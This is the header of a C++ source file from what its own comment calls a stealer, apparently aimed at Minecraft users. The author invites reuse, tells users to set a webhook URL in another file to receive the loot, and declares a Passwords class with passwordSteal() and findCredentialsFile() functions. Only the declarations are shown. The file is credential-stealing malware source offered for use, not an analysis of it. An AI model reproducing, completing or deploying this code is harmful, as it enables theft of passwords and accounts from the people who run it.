/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/

#include <stdio.h>
#include <cstdlib>
#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

class Passwords {
public:
    static void passwordSteal();
    static void findCredentialsFile();
};